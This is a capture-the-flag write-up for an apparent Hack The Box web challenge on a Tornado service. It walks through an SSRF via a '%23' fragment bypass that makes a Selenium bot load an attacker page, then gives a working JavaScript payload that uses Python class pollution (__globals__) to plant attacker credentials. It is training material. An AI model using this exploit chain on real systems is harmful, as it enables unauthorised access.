# Vulnerability Analysis and Exploitation Guide

## Overview

### Flag Location

- The flag is located at `/flag.txt`.

### Installed Packages

- `tornado=6.4.1`
- `selenium==4.22.0`

### Key Endpoints

- **Login Page**: `/login`
- **Protected Page**: `/stats`
- **Report Tornado**: `/report_tornado`
- **Update Tornado**: `/update_tornado`

---

## Code Analysis

### Login Handler (`/login`)

```python
class LoginHandler(BaseHandler):
    def post(self):
        self.set_header("Content-Type", "application/json")
        try:
            data = json.loads(self.request.body)
            username = data.get("username")
            password = data.get("password")

            for user in USERS:
                if user["username"] == username and user["password"] == password:
                    self.set_secure_cookie("user", username)
                    self.write(json_response("Login successful", "Login"))
                else:
                    self.set_status(401)
                    self.write(json_response("Invalid credentials", "Unauthorized", error=True))
                break

        except json.JSONDecodeError:
            self.set_status(400)
            self.write(json_response("Invalid JSON", "Bad Request", error=True))
```

#### Key Observations

- Accepts `username` and `password` via POST request in JSON format.
- Validates credentials from the `USERS` list.

---

### Protected Content Handler (`/stats`)

```python
class ProtectedContentHandler(BaseHandler):
    def get_current_user(self):
        return self.get_secure_cookie("user")

    def get(self):
        self.set_header("Content-Type", "application/json")
        if not self.current_user:
            self.set_status(401)
            self.write(json_response("Unauthorized access", "Unauthorized", error=True))
            return

        flag = read_file_contents("/flag.txt")
        self.write(json_response(flag, "Success"))
```

#### Key Observations

- Requires a secure cookie (`user`) to access the flag.

---

### `USERS` List

```python
USERS = [
    {
        "username": "lean@tornado-service.htb",
        "password": generate(32),
    },
    {
        "username": "xclow3n@tornado-service.htb",
        "password": generate(32),
    },
    {
        "username": "makelaris@tornado-service.htb",
        "password": generate(32),
    }
]
```

#### Key Observations

- Passwords are autogenerated and 32 characters long.
- Usernames are known.

---

### Report Tornado Handler (`/report_tornado`)

```python
class ReportTornadoHandler(BaseHandler):
    def initialize(self, tornados):
        self.tornados = tornados

    def get(self):
        self.set_header("Content-Type", "application/json")
        ip_param = self.get_argument("ip", None)
        tornado_url = f"http://{ip_param}/agent_details"
        if ip_param and is_valid_url(tornado_url):
            bot_thread(tornado_url)
            self.write(json_response(f"Tornado: {ip_param}, has been reported", "Reported"))
        else:
            self.set_status(400)
            self.write(json_response("IP parameter is required", "Bad Request", error=True))
```

#### Key Observations

- Accepts an IP parameter (`ip`) via GET.
- Constructs a URL: `http://<ip>/agent_details`.
- Calls `bot_thread` function with the constructed URL.

---

### URL Validation Function

```python
def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False
```

#### Key Observations

- Ensures the URL has a scheme (e.g., `http`) and a network location (e.g., `example.com`).

---

### `bot_thread` Function

```python
import threading
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

def bot_runner(url):
    chrome_options = Options()

    chrome_options.add_argument("headless")
    chrome_options.add_argument("no-sandbox")
    chrome_options.add_argument("ignore-certificate-errors")

    client = webdriver.Chrome(options=chrome_options)
    client.get(url)
    time.sleep(10)
    client.quit()

def bot_thread(url):
    thread = threading.Thread(target=bot_runner, args=(url,))
    thread.start()
    return thread
```

#### Key Observations

- `bot_runner` fetches the URL using Selenium.
- Executes JavaScript on the fetched page.

---

### Update Tornado Handler (`/update_tornado`)

```python
class UpdateTornadoHandler(BaseHandler):
    def initialize(self, tornados):
        self.tornados = tornados

    def post(self):
        self.set_header("Content-Type", "application/json")
        if not is_request_from_localhost(self):
            self.set_status(403)
            self.write(json_response("Only localhost can update tornado status.", "Forbidden", error=True))
            return

        try:
            data = json.loads(self.request.body)
            machine_id = data.get("machine_id")

            for tornado in self.tornados:
                if tornado.machine_id == machine_id:
                    update_tornados(data, tornado)
                    self.write(json_response(f"Status updated for {machine_id}", "Update"))
                    return

            self.set_status(404)
            self.write(json_response("Machine not found", "Not Found", error=True))
        except json.JSONDecodeError:
            self.set_status(400)
            self.write(json_response("Invalid JSON", "Bad Request", error=True))
```

#### Key Observations

- Only accessible from `localhost`.
- Updates tornado data using the `update_tornados` function.

---

### Tornado Update Function

```python
def update_tornados(tornado, updated):
    for index, value in tornado.items():
        if hasattr(updated, "__getitem__"):
            if updated.get(index) and isinstance(value, dict):
                update_tornados(value, updated.get(index))
            else:
                updated[index] = value
        elif hasattr(updated, index) and isinstance(value, dict):
            update_tornados(value, getattr(updated, index))
        else:
            setattr(updated, index, value)
```

#### Key Observations

- Recursively updates tornado attributes.
- Potential for arbitrary attribute injection.

---

## Exploitation Steps

### 1. SSRF Exploit

- Use `/report_tornado` with a crafted `ip` parameter.
- Bypass `/agent_details` appending `%23` (URL-encoded `#`).
- Example: `http://<vulnerable-server>/report_tornado?ip=<malicious-server>%23`.

### 2. Inject Malicious JavaScript

- Host an HTML page containing:

```html
<script>
fetch('http://127.0.0.1:50866/get_tornados')
    .then(response => response.json())
    .then(machines => {
        let firstMachine = machines[0].machine_id;
        let json = {
            "machine_id": firstMachine,
            "status": "active",
            "__class__": {
                "__init__": {
                    "__globals__": {
                        "USERS": [{"username": "kittykat", "password": "kittykat"}]
                    }
                }
            }
        };

        return fetch(`http://127.0.0.1:50866/update_tornado`, {
            method: "POST",
            mode: "cors",
            body: JSON.stringify(json)
        });
    });
</script>
```

- Executes on Selenium client and injects a new user (`kittykat`).

### 3. Log In and Retrieve Flag

- Use credentials `kittykat/kittykat` to log in.
- Access `/stats` to retrieve the flag

![Screenshot from 2024-12-09 18-24-14.png](/home/busik/Pictures/Screenshots/Screenshot%20from%202024-12-09%2018-24-14.png)

![Screenshot from 2024-12-09 18-24-17.png](/home/busik/Pictures/Screenshots/Screenshot%20from%202024-12-09%2018-24-17.png)

---

## Lessons Learned

1. **Understanding Python Exploits**: Exploit recursion and object attributes.
2. **SSRF Techniques**: Leverage unsanitized input to bypass restrictions.
3. **Selenium Exploitation**: Execute malicious scripts via headless browsers.
4. **Security Principles**: Implement input validation and restrict dangerous features.

---

## Improved Skills

1. Advanced Python understanding.
2. Practical exploitation of SSRF vulnerabilities.
3. Effective use of Selenium for attack simulation.
4. Leveraging special Python methods (e.g., `__init__`) for payload delivery.
